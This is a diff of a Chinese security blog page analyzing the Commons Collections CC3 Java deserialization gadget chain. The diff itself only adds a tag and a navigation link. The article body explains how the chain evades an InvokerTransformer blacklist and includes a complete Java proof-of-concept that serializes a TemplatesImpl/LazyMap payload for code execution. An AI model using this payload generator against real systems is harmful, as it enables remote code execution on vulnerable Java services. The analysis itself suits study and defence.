@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>CommonsCollections3分析 | Reus09&#39;s Blog</title>
-<meta name="keywords" content="">
+<meta name="keywords" content="CommonsCollections链">
 <meta name="description" content="因有事耽搁了一天，今天继续CommonsCollection3链的学习。 CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并">
 <meta name="author" content="Reus09">
 <link rel="canonical" href="http://www.reus09.top/posts/tech/commonscollections3%E5%88%86%E6%9E%90/">
@@ -102,7 +102,7 @@
   "name": "CommonsCollections3分析",
   "description": "因有事耽搁了一天，今天继续CommonsCollection3链的学习。 CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并",
   "keywords": [
-    ""
+    "CommonsCollections链"
   ],
   "articleBody": "因有事耽搁了一天，今天继续CommonsCollection3链的学习。\nCC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。\n在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。\n在 CC2 中，使用TemplatesImpl的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。\n而在 CC3 中，使用了 CC1 和 LazyMap 和 CC3 的 TemplatesImpl，中间寻找了其他的触发newTransformer的实现方式，同时，CC3没有使⽤到InvokerTransformer，因为在SerialKiller这个Java反序列化过滤器中，将InvokerTransformer加入了黑名单，CC3就是为了绕过这一限制。\n前置知识 TrAXFilter 在 SAX API 中提供了一个过滤器接口 org.xml.sax.XMLFilter，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。\ncom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates/TransformerImpl/TransformerHandlerImpl 属性，\nTrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了。\nInstantiateTransformer 有了上述 gadget ，接下来的重点就是需要我们实例化这个 TrAXFilter，实例化我们当然可以使用 InvokerTransformer 反射拿到 Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。\nCommons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 transform() 方法实际上接收一个 Class 类型的对象，通过 getConstructor 获取构造方法，并通过 newInstance 创建类实例。\n同时，我们也看一下InstantiateTransformer是如何实现初始化的。\n需要传入构造器的参数类型iParamTypes，然后传入构造器的参数iArgs。\n攻击构造 结合一下Gadget,我们可以总结以下思路。\n通过代理readObject触发它的invoke，调用LazyMap的get，再调用chainedTransformer，实现通过InstantiateTransformer对TrAXFilter进行实例化，实例化的参数类型是Templates.class，参数是templatesImpl。TrAXFilter实例化时调用newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了\nPOC部分和CC1差不多了，使用LazyMap对hashMap进行包装；实例化AnnotationInvocationHandler，并对其进行代理；通过实例化参数为代理的InvocationHandler，对代理进行包装。 最后序列化。\n代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public class CC3 { public static String fileName = \"CC3.bin\"; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException { // 读取恶意类 bytes[] InputStream inputStream = CC3.class.getResourceAsStream(\"EvilClassForCC3.class\"); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); // 初始化 TemplatesImpl 对象 TemplatesImpl tmpl = new TemplatesImpl(); Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]{bytes}); // _name 不能为空 Field name = TemplatesImpl.class.getDeclaredField(\"_name\"); name.setAccessible(true); name.set(tmpl, \"reus09\"); // 结合 ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }); // 初始化 LazyMap Map lazyMap = LazyMap.decorate(new HashMap(), chain); Class\u003c?\u003e c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor\u003c?\u003e constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例 InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); // 创建LazyMap的动态代理类实例 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); // 使用动态代理初始化 AnnotationInvocationHandler InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy); SerializeUtil.writeObjectToFile(invocationHandler, fileName); //\tSerializeUtil.readFileObject(fileName); } } 攻击结果：\n总结 以上就是 CC3 链分析的全部内容了，最后总结一下。\n利用说明： 利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get/set 等操作，配合 LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，利用了 InstantiateTransformer 实例化 TrAXFilter 类，并调用 TemplatesImpl 的 newTransformer 方法实例化恶意类字节码触发漏洞。 Gadget 总结： kick-off gadget：sun.reflect.annotation.AnnotationInvocationHandler#readObject() sink gadget：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer() chain gadget：org.apache.commons.collections.functors.InstantiateTransformer#transform() 调用链展示： 1 2 3 4 5 6 7 8 AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() TemplatesImpl.newTransformer() 依赖版本\ncommons-collections : 3.1～3.2.1 jdk \u003c 7u21\n",
   "wordCount" : "1706",
@@ -484,8 +484,14 @@ jdk &lt; 7u21</p>
 
   <footer class="post-footer">
     <ul class="post-tags">
+      <li><a href="http://www.reus09.top/tags/commonscollections%E9%93%BE/">CommonsCollections链</a></li>
     </ul>
 <nav class="paginav">
+  <a class="prev" href="http://www.reus09.top/posts/tech/commonscollections4%E5%88%86%E6%9E%90/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>CommonsCollections4分析</span>
+  </a>
   <a class="next" href="http://www.reus09.top/posts/tech/commonscollections2%E5%88%86%E6%9E%90/">
     <span class="title">Next »</span>
     <br>
